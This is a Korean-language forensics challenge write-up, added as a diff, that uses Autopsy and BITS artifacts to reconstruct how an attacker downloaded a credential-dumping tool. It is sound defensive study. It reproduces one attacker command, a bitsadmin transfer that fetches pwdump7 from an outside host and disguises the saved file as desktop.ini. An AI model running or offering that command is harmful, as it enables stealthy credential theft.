@@ -1,0 +1,85 @@
+# Forensic 챌린지 — Malware Downloader (#103)
+
+## 개요
+
+디지털 포렌식 챌린지(디포챌)의 실제 문제를 Autopsy로 분석한다. 시작 파일은 **Malware downloader** 사건으로, 공격자가 **자격 증명 덤프 도구를 다운로드한 후 사용자 자격 증명을 덤프하려 시도**한 정황을 추적한다.
+
+핵심 질문: **공격자는 어떻게 자격 증명 덤프 도구를 다운로드했는가?**
+
+![](../Images/Pasted%20image%2020261125093613.png)
+
+Autopsy에 루트 파일(이미지)을 드래그하여 트리 형식으로 펼친다.
+
+![](../Images/Pasted%20image%2020261125094243.png)
+
+> 참고: **Autopsy**는 Sleuth Kit 기반의 오픈소스 포렌식 플랫폼이다. 디스크 이미지를 로드하면 파일시스템, 삭제 파일, 웹 기록, 레지스트리, 타임라인 등을 자동 파싱해 트리로 보여준다.
+
+---
+
+## 문제 1 — 다운로드에 사용된 URI (URL)
+
+![](../Images/Pasted%20image%2020261125094539.png)
+
+### 접근 방법
+파일이 다운로드되어 저장되는 **자주 쓰이는 임시 위치**부터 조사한다.
+- `%TEMP%`, `%TMP%`, `%APPDATA%`, `%LOCALAPPDATA%`
+
+PowerShell 명령 흔적 조사로는 단서를 찾지 못했다. 대신 **Windows가 제공하는 백그라운드 다운로드 기능인 BITS**를 의심한다.
+
+### BITS (Background Intelligent Transfer Service)
+- Windows Update 등이 쓰는 **백그라운드 파일 전송 서비스**. 네트워크 유휴 대역을 이용해 조용히 다운로드한다.
+- 공격자가 애용하는 이유: **정상 시스템 서비스(svchost)**를 통해 다운로드되므로, 방화벽/EDR 탐지를 우회하거나 지연시킬 수 있다. (LotL, Living off the Land 기법)
+
+### BITS 흔적을 확인하는 위치
+- `%ProgramData%\Microsoft\Network\Downloader\edb.log`
+- `%ProgramData%\Microsoft\Network\Downloader\qmgr.db` (전송 작업 큐 DB)
+- 이벤트 로그: `Microsoft-Windows-Bits-Client%4Operational.evtx`
+
+**정답(URI):** `http://www.tarasco.org/security/pwdump_7/pwdump7.zip`
+
+> 참고: pwdump7은 SAM에서 비밀번호 해시를 추출하는 **자격 증명 덤프 도구**다. 이것을 받았다는 것은 공격자가 자격 증명 탈취를 노린다는 의미.
+
+![](../Images/Pasted%20image%2020261125102950.png)
+
+---
+
+## 문제 2 — 저장 위치 (Full Path)
+
+![](../Images/Pasted%20image%2020261125103720.png)
+
+해당 위치에 temp 파일이 있어야 하는데 다른 것이 들어 있다. 폴더에 `desktop.ini`가 있고, 그 외 이상한 형식의 파일이 보여 함께 보존한다.
+
+- BITS 이벤트 로그(`Microsoft-Windows-Bits-Client%4Operational.evtx`)에서 전송 대상 경로를 확인.
+
+**정답(저장 경로):** `C:\Users\Public\Downloads\desktop.ini`
+
+> 분석 포인트: 실행 파일(zip)을 `desktop.ini`라는 **정상 시스템 파일명으로 위장**해 저장한 것. 이름만 보면 폴더 설정 파일처럼 보이지만 실제 내용은 다운로드된 악성 도구다. 위장 파일명은 전형적인 은닉 기법.
+
+![](../Images/Pasted%20image%2020261125103849.png)
+
+이 폴더에서 다운로드 흔적이 남은 로그 파일들을 확인할 수 있다.
+
+---
+
+## 문제 3 — 다운로드에 사용한 명령어
+
+- `cmd` 또는 `powershell`을 먼저 의심하지만, BITS 기반이므로 **`bitsadmin`** 명령을 추정한다.
+- **FireEye BitsParser**로 `qmgr.db`를 파싱하여 전송 작업을 분석하면 명령/대상 URL/저장 경로를 복원할 수 있다.
+
+**추정 명령어:**
+```
+bitsadmin /TRANSFER 1442 http://www.tarasco.org/security/pwdump_7/pwdump7.zip c:\Users\Public\Downloads\desktop.ini
+```
+
+> 정리: 이 사건의 핵심은 "PowerShell이 아니라 **BITS라는 정상 서비스로 다운로드**했다"는 점이다. 그래서 `qmgr.db` / BITS 이벤트 로그라는 **전용 아티팩트**를 알아야 풀린다.
+
+---
+
+## 활성 데이터 수집 스크립트 (참고)
+
+침해사고 초기 대응에서 **휘발성/활성 데이터를 빠르게 수집**하는 스크립트. (원본은 Images 폴더에 있음)
+
+- Linux: [collect-linux-ir.sh](../Images/collect-linux-ir.sh)
+- Windows: [Collect-WindowsIR.bat](../Images/Collect-WindowsIR.bat)
+
+> 참고: 이런 IR 수집 스크립트는 프로세스 목록, 네트워크 연결, 로그인 세션, 자동실행 항목, 최근 실행 기록 등 **덮어쓰이기 쉬운 활성 아티팩트를 한 번에 덤프**한다. 수집 순서는 휘발성이 높은 것(메모리, 네트워크 상태)부터가 원칙(Order of Volatility).
